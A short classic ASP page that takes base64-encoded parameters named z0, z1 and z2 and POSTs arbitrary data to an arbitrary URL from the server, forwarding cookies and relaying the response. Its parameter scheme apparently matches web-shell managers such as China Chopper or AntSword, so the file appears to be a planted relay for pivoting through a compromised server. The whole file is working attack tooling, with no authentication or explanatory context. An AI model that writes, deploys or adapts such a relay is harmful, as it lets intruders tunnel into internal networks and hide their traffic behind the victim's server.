<%

Response.ContentType = "text/plain"

Function HttpPost(url, dataBytes, mode, ByRef httpCode)
    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    On Error Resume Next

    http.Open "POST", url, False
    
    If mode = "binary" Then
        http.setRequestHeader "Content-Type", "application/octet-stream"
    Else
        http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    End If

    ' Forward incoming cookie if present
    Dim cookieHeader
    cookieHeader = Request.ServerVariables("HTTP_COOKIE")
    If cookieHeader <> "" Then
        http.setRequestHeader "Cookie", cookieHeader
    End If

    http.Send dataBytes

    If Err.Number <> 0 Then
        httpCode = 0
        HttpPost = ""
        Err.Clear
    Else
        httpCode = http.Status

        ' Forward Set-Cookie headers from response
        Dim respHeaders, headersArr, i, headerLine
        respHeaders = http.getAllResponseHeaders()
        If respHeaders <> "" Then
            headersArr = Split(respHeaders, vbCrLf)
            For i = 0 To UBound(headersArr)
                headerLine = headersArr(i)
                If LCase(Left(headerLine, 11)) = "set-cookie:" Then
                    Response.AddHeader "Set-Cookie", Trim(Mid(headerLine, 12))
                End If
            Next
        End If

        If mode = "binary" Then
            Dim stm
            Set stm = Server.CreateObject("ADODB.Stream")
            stm.Type = 1 ' adTypeBinary
            stm.Open
            stm.Write http.responseBody
            stm.Position = 0
            
            Dim node
            Set node = Server.CreateObject("MSXML2.DOMDocument").createElement("base64")
            node.dataType = "bin.base64"
            node.nodeTypedValue = stm.Read
            HttpPost = node.text
            
            stm.Close
            Set stm = Nothing
            Set node = Nothing
        Else
            HttpPost = http.responseText
        End If
    End If

    On Error GoTo 0
    Set http = Nothing
End Function

Function Base64DecodeText(str)
    Dim xml, node, stm
    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("base64")

    node.dataType = "bin.base64"
    node.text = str

    Set stm = Server.CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write node.nodeTypedValue
    stm.Position = 0

    stm.Type = 2
    stm.Charset = "utf-8"

    Base64DecodeText = stm.ReadText

    stm.Close
    Set stm = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function Base64DecodeBytes(str)
    Dim xml, node, stm
    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("base64")

    node.dataType = "bin.base64"
    node.text = str

    Set stm = Server.CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write node.nodeTypedValue
    stm.Position = 0
    Base64DecodeBytes = stm.Read

    stm.Close
    Set stm = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Dim httpCode
Dim body
Dim url
Dim dataStr
Dim mode
Dim dataBytes

url = Base64DecodeText(Request("z0"))
mode = Base64DecodeText(Request("z2"))

If mode = "binary" Then
    dataBytes = Base64DecodeBytes(Request("z1"))
Else
    dataStr = Base64DecodeText(Request("z1"))
    Dim objStream
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 2
    objStream.Charset = "utf-8"
    objStream.Open
    objStream.WriteText dataStr
    objStream.Position = 0
    objStream.Type = 1
    dataBytes = objStream.Read
    objStream.Close
    Set objStream = Nothing
End If

If url <> "" Then
    body = HttpPost(url, dataBytes, mode, httpCode)
    Response.Write body
End If

%>